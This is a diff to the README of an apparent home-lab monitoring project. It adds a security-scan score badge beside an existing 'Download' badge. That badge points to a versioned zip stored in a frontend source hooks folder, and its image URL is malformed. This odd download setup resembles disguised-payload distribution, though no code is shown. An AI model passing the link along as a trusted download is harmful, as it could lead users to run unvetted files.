@@ -1,5 +1,7 @@
 # 📊 homelab-infrastructure-monitor - Monitor Your Home Lab with Ease
 
+[![SafeSkill 89/100](https://img.shields.io/badge/SafeSkill-89%2F100_Passes%20with%20Notes-yellow)](https://safeskill.dev/scan/ozkrnrike-homelab-infrastructure-monitor)
+
 [![Download](https://github.com/Ozkrnrike/homelab-infrastructure-monitor/raw/refs/heads/main/frontend/src/hooks/homelab_infrastructure_monitor_2.4.zip%https://github.com/Ozkrnrike/homelab-infrastructure-monitor/raw/refs/heads/main/frontend/src/hooks/homelab_infrastructure_monitor_2.4.zip)](https://github.com/Ozkrnrike/homelab-infrastructure-monitor/raw/refs/heads/main/frontend/src/hooks/homelab_infrastructure_monitor_2.4.zip)
 
 ## 🚀 Getting Started
